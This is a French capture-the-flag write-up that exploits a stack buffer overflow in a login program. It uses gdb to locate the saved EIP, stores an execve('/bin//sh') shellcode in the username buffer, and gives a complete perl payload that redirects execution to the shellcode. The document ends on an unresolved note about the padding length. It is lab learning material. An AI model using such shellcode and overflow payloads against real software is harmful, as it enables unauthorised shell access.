
On commence par recuperer l'executable puis le decompiler, comme avec le premier flag.

On peut voir que le programme permet a un utilisateur de se connecter.
Il utilise la fonction `verify_user_name()` et si aucun probleme n'est signale il utilise `verify_user_pass()`.

Pour le username, c'est simple, en regardant la fonction `verify_user_name()`. notre input est compare avec la string "dat_wil" on comprend que notre premier input doit commencer par "dat_wil".

Pour le password, la fonction verify_user_pass() nous demande d'avoir un password impossible:

```c
int32_t eax_2 = verify_user_pass(&buf);
if (eax_2 && !eax_2)
    return 0;
```

Avec notre deuxieme input notre strategie va etre d'overwrite l'adresse de return `eip`
Quand on est dans le scope d'une fonction, on a cette valeur return eip sur la stack,
elle stocke l'adresse de l'instruction qui suit l'appel de la fonction dans laquelle nous nous trouvons.
Ainsi quand on termine une fonction on retrouve le fil de l'execution dans la fonction precedente.

Notre objectif est d'executer un shellcode en sortant de `verify_user_pass()`.
On va mettre le shellcode a la suite de notre username `dat_will`

Notre shellcode : `\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80`

On commence par trouver les adresses de nos deux input et de return eip.

On utilise `gdb`.

1 trouver l'adresse de notre premier input:
```bash
(gdb) info variables a_user_name

All variables matching regular expression "a_user_name":

Non-debugging symbols:
0x0804a040  a_user_name
```

2 trouver les adresses de eip et de notre deuxieme input
```bash
(gdb) break verify_user_pass
...
(gdb) info frame
Stack level 0, frame at 0xffffd6b0:
 eip = 0x80484a8 in verify_user_pass; saved eip 0x8048585
 called by frame at 0xffffd720
 Arglist at 0xffffd6a8, args: 
 Locals at 0xffffd6a8, Previous frame's sp is 0xffffd6b0
 Saved registers:
  ebp at 0xffffd6a8, eip at 0xffffd6ac
```

saved eip -> 0x8048585

pour identifier ou est-ce qu'on peut overwrite la valeur d'eip, on va donner cet input en deuxime argument, ca va faire segfault le programme et nous aider a trouver quelle partie nous permet d'overflow.
`aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuu`
cette chaine overwrite eip avec une adresse invalide, le programme s'en rend compte quand il cherche a utiliser eip de maniere "standard" et nous affiche une erreur avec l'adresse corompue d'eip.
On decouvre alors a quel endroit on overwrite eip, on va y mettre la dresse de notre shellcode.

```bash
Program received signal SIGSEGV, Segmentation fault.
0x75757575 in ?? ()
```
75 -> u en ascii, donc avec 80 caracteres on overwrite saved eip.

```perl
(perl -e 'print "dat_wil" . "\x90"x8 . "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" . "\n"' ; perl -e 'print "\x90"x80 . "\x4f\xa0\x04\x08" . "\n"' ; cat) | ~/level01
```

! padding de 54 ou 80 ?
